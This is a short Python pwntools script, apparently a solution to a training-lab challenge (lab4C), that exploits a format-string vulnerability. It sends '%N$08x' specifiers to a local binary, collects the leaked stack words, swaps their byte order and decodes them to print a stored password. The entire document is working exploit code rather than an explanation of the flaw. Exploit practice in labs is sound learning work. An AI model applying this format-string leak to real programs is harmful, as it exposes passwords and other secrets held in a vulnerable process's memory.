from pwn import *
import re

proc = process("/levels/lab04/lab4C")

offset = 29
length = 8
hex_length = 8

command = ''
for j in range(length):
    command += '%' + str(offset+j) + '$0' + str(hex_length) + 'x '


proc.sendline(command)
proc.sendline()
ret = proc.recv(1024)
print(ret)

vals = [x for x in re.split('[%s \n]', ret) if all(c in string.hexdigits for c in x) and len(x)==hex_length]
#converted = '\\x' + '\\x'.join(a+b for a,b in zip(pword[::2], pword[1::2]))

big_vals = []
for val in vals:
    byts = bytearray.fromhex(val)
    byts.reverse()
    big = ''.join(format(x, '02x') for x in byts)
    big_vals.append(big)

print(''.join(big_vals).strip('00').decode('hex'))
